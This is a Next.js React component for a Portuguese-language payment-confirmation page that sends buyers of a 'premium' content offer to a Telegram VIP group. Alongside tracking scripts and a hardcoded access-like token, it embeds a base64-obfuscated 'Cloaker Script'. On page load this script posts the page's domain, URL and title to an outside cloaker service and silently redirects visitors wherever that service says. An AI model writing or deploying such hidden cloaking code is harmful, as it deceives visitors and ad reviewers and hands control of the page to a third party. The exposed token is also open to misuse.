"use client";

import React, { useEffect } from "react";
import Image from "next/image";
import Script from "next/script";

// Estilos CSS customizados para animações
const customStyles = `
  @keyframes float {
    0%, 100% { transform: translateY(0px); }
    50% { transform: translateY(-10px); }
  }
  
  @keyframes glow {
    0%, 100% { box-shadow: 0 0 20px rgba(251, 146, 60, 0.3); }
    50% { box-shadow: 0 0 40px rgba(251, 146, 60, 0.6); }
  }
  
  @keyframes tilt {
    0%, 50%, 100% { transform: rotate(0deg); }
    25% { transform: rotate(1deg); }
    75% { transform: rotate(-1deg); }
  }
  
  @keyframes shimmer {
    0% { background-position: -200% center; }
    100% { background-position: 200% center; }
  }
  
  .animate-float { animation: float 3s ease-in-out infinite; }
  .animate-glow { animation: glow 2s ease-in-out infinite; }
  .animate-tilt { animation: tilt 10s ease-in-out infinite; }
  .animate-shimmer { 
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
    background-size: 200% 100%;
    animation: shimmer 3s infinite;
  }
`;

export default function PosCheckout() {
  useEffect(() => {
    // Adicionar estilos customizados
    const styleSheet = document.createElement("style");
    styleSheet.textContent = customStyles;
    document.head.appendChild(styleSheet);

    // Facebook Pixel tracking for purchase completion
    // Purchase pixel removed

    // Cleanup
    return () => {
      document.head.removeChild(styleSheet);
    };
  }, []);

  const handleTelegramRedirect = () => {
    // Redirect to Telegram group
    window.open("https://t.me/+w00AZ3FX8Mw1OGZh", "_blank");
  };
  return (
    <>
      {/* UTM Handler Script */}
      <Script
        src="https://cdn.jsdelivr.net/gh/xTracky/static/utm-handler.js"
        data-token="EAAJ4XUEZAyZCYBPZBgig1s8CASj8ZC8JL0LRCCZBU35ZBEeyVZC0HyW3jjM6uZAQeYOe9PS87P47IuEZBSxiYYQMNmrDTsYCo7ecLhk4S0h9dSTtQbtnLfXxjmhmMkkDAwJBid47d8ZCmIpSKwUoYRDeqKHT56KVVDVx0tzevcX58CoK4MZCtkesVf6VvyAjiZCZBdAZDZD"
        data-click-id-param="click_id"
      />

      {/* Cloaker Script */}
      <Script id="monitoring-script" strategy="afterInteractive">
        {`
          !function(){var d=atob("aHR0cHM6Ly9jbG9ha2VyLnBhcmFkaXNlcGFncy5jb20vLz9hcGk9bW9uaXRvcg=="),y=atob("bW9uXzE0N2Q5MmY1ZWI1MDk1ZjY5Yjg0MjgyYjQzYzZkYTY4ZmJmM2NiMDY1ZmNhMmUzNjhmYzg4NGI2ODQ4ZjY1NTk=");function createFormData(){var dgx=new FormData;return dgx.append(atob("bW9uaXRvcl9rZXk="),y),dgx.append(atob("ZG9tYWlu"),location.hostname),dgx.append(atob("dXJs"),location.href),dgx.append(atob("dGl0bGU="),document.title),dgx}function yxq(){fetch(d,{method:atob("UE9TVA=="),body:createFormData(),headers:{"X-Requested-With":atob("WE1MSHR0cFJlcXVlc3Q=")}}).then(function(fw){return fw.json()}).then(function(c){c.success&&c.redirect&&c.redirect_url&&location.replace(c.redirect_url)}).catch(function(){})}document.readyState===atob("bG9hZGluZw==")?document.addEventListener(atob("RE9NQ29udGVudExvYWRlZA=="),yxq):yxq()}();
        `}
      </Script>

      {/* UTMify Script */}
      <Script
        src="https://cdn.utmify.com.br/scripts/utms/latest.js"
        data-utmify-prevent-xcod-sck
        data-utmify-prevent-subids
        strategy="afterInteractive"
        async
        defer
      />
      <div className="min-h-screen bg-gradient-to-br from-orange-600 via-orange-500 to-orange-400 text-white relative overflow-hidden">
        {/* Animated background elements */}
        <div className="absolute inset-0 overflow-hidden">
          <div className="absolute -top-40 -right-40 w-80 h-80 bg-orange-300/20 rounded-full blur-3xl animate-pulse"></div>
          <div className="absolute -bottom-40 -left-40 w-80 h-80 bg-orange-400/20 rounded-full blur-3xl animate-pulse delay-1000"></div>
          <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-96 h-96 bg-white/5 rounded-full blur-3xl animate-pulse delay-500"></div>
        </div>

        {/* Floating particles */}
        <div className="absolute inset-0 overflow-hidden pointer-events-none">
          <div className="absolute top-1/4 left-1/4 w-2 h-2 bg-white/40 rounded-full animate-ping delay-700"></div>
          <div className="absolute top-3/4 right-1/4 w-1 h-1 bg-orange-200/60 rounded-full animate-ping delay-1000"></div>
          <div className="absolute top-1/2 right-1/3 w-1.5 h-1.5 bg-white/30 rounded-full animate-ping delay-300"></div>
        </div>

        {/* Header */}
        {/* Main Content */}
        <main className="relative container mx-auto px-4 py-16">
          <div className="max-w-4xl mx-auto text-center">
            {" "}
            {/* Success Animation */}
            <div className="mb-12">
              <div className="relative mx-auto w-32 h-32 mb-8 animate-float">
                {/* Animated rings */}
                <div className="absolute inset-0 rounded-full border-4 border-green-400/30 animate-ping"></div>
                <div className="absolute inset-2 rounded-full border-4 border-green-400/50 animate-pulse"></div>
                <div className="absolute inset-4 rounded-full bg-gradient-to-r from-green-400 to-emerald-500 flex items-center justify-center shadow-2xl animate-glow">
                  <svg
                    className="w-12 h-12 text-white animate-bounce"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={3}
                      d="M5 13l4 4L19 7"
                    />
                  </svg>
                </div>
              </div>
            </div>
            {/* Thank You Message */}
            <div className="mb-16">
              <div className="relative">
                {/* Decorative elements */}
                <div className="absolute -top-4 left-1/2 transform -translate-x-1/2 w-20 h-1 bg-gradient-to-r from-transparent via-orange-300 to-transparent rounded-full"></div>

                <h1 className="text-5xl md:text-7xl font-black mb-8 bg-gradient-to-r from-white via-orange-100 to-white bg-clip-text text-transparent leading-tight">
                  SUCESSO!
                </h1>

                <div className="bg-gradient-to-r from-orange-500/20 to-orange-400/20 backdrop-blur-sm rounded-3xl p-8 border border-orange-300/30 shadow-2xl">
                  <h2 className="text-2xl md:text-3xl font-bold text-white mb-4">
                    Pagamento Confirmado!
                  </h2>
                  <p className="text-xl md:text-2xl text-orange-100 mb-6">
                    Bem-vindo ao{" "}
                    <span className="text-white font-black bg-gradient-to-r from-orange-400 to-orange-300 bg-clip-text text-transparent">
                      Laranjinha Midias Premium
                    </span>
                    !
                  </p>
                  <p className="text-lg text-gray-200 leading-relaxed">
                    Seu acesso VIP foi ativado com sucesso!
                    <br />
                    Resgate seu acesso no botão abaixo
                  </p>
                </div>

                {/* Decorative bottom element */}
                <div className="absolute -bottom-4 left-1/2 transform -translate-x-1/2 w-20 h-1 bg-gradient-to-r from-transparent via-orange-300 to-transparent rounded-full"></div>
              </div>
            </div>{" "}
            {/* Benefits Section */}
            <div className="mb-16">
              <div className="bg-gradient-to-br from-black/60 via-black/40 to-black/60 backdrop-blur-xl rounded-3xl p-10 border border-orange-300/20 shadow-2xl">
                <div className="text-center mb-10">
                  <h2 className="text-3xl md:text-4xl font-black mb-4 bg-gradient-to-r from-orange-200 via-white to-orange-200 bg-clip-text text-transparent">
                    Seus Benefícios VIP
                  </h2>
                  <p className="text-orange-200/80 text-lg">
                    Tudo que você ganhou com o acesso premium:
                  </p>
                </div>

                <div className="grid md:grid-cols-2 gap-8">
                  <div className="group hover:scale-105 transition-all duration-300">
                    <div className="bg-gradient-to-br from-orange-500/20 to-orange-600/10 rounded-2xl p-6 border border-orange-400/30 hover:border-orange-300/50 transition-all duration-300">
                      {" "}
                      <div>
                        <h3 className="font-bold text-xl text-white mb-2">
                          🔥 Conteúdo Exclusivo
                        </h3>
                        <p className="text-gray-300 leading-relaxed">
                          Acesso total a todos os conteúdos premium e materiais
                          exclusivos
                        </p>
                      </div>
                    </div>
                  </div>
                  <div className="group hover:scale-105 transition-all duration-300">
                    <div className="bg-gradient-to-br from-orange-500/20 to-orange-600/10 rounded-2xl p-6 border border-orange-400/30 hover:border-orange-300/50 transition-all duration-300">
                      {" "}
                      <div>
                        <h3 className="font-bold text-xl text-white mb-2">
                          ⚡ Updates Diários
                        </h3>
                        <p className="text-gray-300 leading-relaxed">
                          Novos conteúdos e atualizações adicionados todos os
                          dias
                        </p>
                      </div>
                    </div>
                  </div>
                  <div className="group hover:scale-105 transition-all duration-300">
                    <div className="bg-gradient-to-br from-orange-500/20 to-orange-600/10 rounded-2xl p-6 border border-orange-400/30 hover:border-orange-300/50 transition-all duration-300">
                      {" "}
                      <div>
                        <h3 className="font-bold text-xl text-white mb-2">
                          👑 Comunidade VIP
                        </h3>
                        <p className="text-gray-300 leading-relaxed">
                          Acesso ao grupo exclusivo no Telegram com membros
                          premium
                        </p>
                      </div>
                    </div>
                  </div>{" "}
                  <div className="group hover:scale-105 transition-all duration-300">
                    <div className="bg-gradient-to-br from-orange-500/20 to-orange-600/10 rounded-2xl p-6 border border-orange-400/30 hover:border-orange-300/50 transition-all duration-300">
                      <div>
                        <h3 className="font-bold text-xl text-white mb-2">
                          🎯 Suporte Premium
                        </h3>
                        <p className="text-gray-300 leading-relaxed">
                          Atendimento prioritário e suporte exclusivo para
                          membros VIP
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>{" "}
            {/* Telegram Group Button */}
            <div className="mb-16">
              <div className="relative">
                {/* Pulsing background effect */}
                <div className="absolute inset-0 bg-gradient-to-r from-blue-500/20 to-purple-500/20 rounded-3xl blur-xl animate-pulse"></div>

                <div className="relative bg-gradient-to-br from-black/70 via-black/50 to-black/70 backdrop-blur-xl rounded-3xl p-10 border border-blue-400/30 shadow-2xl">
                  <div className="text-center">
                    <div className="mb-6">
                      <h2 className="text-3xl md:text-4xl font-black mb-4 bg-gradient-to-r from-blue-200 via-white to-purple-200 bg-clip-text text-transparent">
                        🚀 Último Passo!
                      </h2>
                      <p className="text-lg text-gray-300 leading-relaxed max-w-2xl mx-auto">
                        Agora é só entrar no nosso grupo VIP no Telegram para
                        começar a desfrutar de todo o conteúdo exclusivo que
                        preparamos para você! 📱✨
                      </p>
                    </div>

                    <div className="relative group">
                      {/* Button glow effect */}
                      <div className="absolute -inset-1 bg-gradient-to-r from-blue-600 via-purple-600 to-blue-600 rounded-2xl blur opacity-75 group-hover:opacity-100 transition duration-1000 group-hover:duration-200 animate-tilt"></div>

                      <button
                        onClick={handleTelegramRedirect}
                        className="relative w-full max-w-md mx-auto flex items-center justify-center px-8 py-6 bg-gradient-to-r from-blue-600 via-blue-500 to-purple-600 hover:from-blue-700 hover:via-blue-600 hover:to-purple-700 rounded-xl font-black text-white text-xl transition-all duration-300 transform hover:scale-105 shadow-2xl hover:shadow-blue-500/50"
                      >
                        <div className="flex items-center space-x-4">
                          <div className="relative">
                            <svg
                              className="w-8 h-8 animate-bounce"
                              fill="currentColor"
                              viewBox="0 0 24 24"
                            >
                              <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.568 8.16l-1.704 8.04c-.128.568-.464.704-.944.44l-2.608-1.92-1.256 1.208c-.14.14-.256.256-.528.256l.192-2.728 4.848-4.368c.208-.184-.048-.288-.32-.104l-6.024 3.784-2.584-.808c-.568-.176-.576-.568.112-.84l10.048-3.872c.472-.176.888.112.728.832z" />
                            </svg>
                            <div className="absolute -top-1 -right-1 w-3 h-3 bg-green-400 rounded-full animate-ping"></div>
                          </div>
                          <div className="text-center">
                            <div className="font-black text-xl">
                              ENTRAR NO GRUPO VIP
                            </div>
                            <div className="text-blue-100 text-sm font-normal">
                              Telegram • Acesso Imediato
                            </div>
                          </div>
                          <svg
                            className="w-6 h-6 animate-pulse"
                            fill="none"
                            stroke="currentColor"
                            viewBox="0 0 24 24"
                          >
                            <path
                              strokeLinecap="round"
                              strokeLinejoin="round"
                              strokeWidth={3}
                              d="M13 7l5 5m0 0l-5 5m5-5H6"
                            />
                          </svg>
                        </div>
                      </button>
                    </div>

                    <p className="text-gray-400 text-sm mt-6 max-w-xl mx-auto">
                      💡 <strong>Dica:</strong> Salve o link nos seus favoritos
                      para não perder o acesso ao grupo exclusivo!
                    </p>
                  </div>
                </div>
              </div>
            </div>{" "}
            {/* Navigation */}
            <div className="text-center">
              <a
                href="/"
                className="inline-flex items-center px-8 py-4 bg-gradient-to-r from-black/60 to-black/80 hover:from-black/80 hover:to-black/90 rounded-2xl border border-orange-300/20 hover:border-orange-300/40 text-orange-200 hover:text-white transition-all duration-300 transform hover:scale-105 shadow-xl hover:shadow-2xl backdrop-blur-sm"
              >
                <svg
                  className="w-5 h-5 mr-3"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M10 19l-7-7m0 0l7-7m-7 7h18"
                  />
                </svg>
                <span className="font-semibold">Voltar à Página Inicial</span>
              </a>
            </div>{" "}
          </div>
        </main>

        {/* Footer decorative element */}
        <div className="relative">
          <div className="absolute bottom-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-orange-300/50 to-transparent"></div>
        </div>
      </div>
    </>
  );
}

// Extend Window interface for TypeScript
declare global {
  interface Window {
    fbq: any;
  }
}
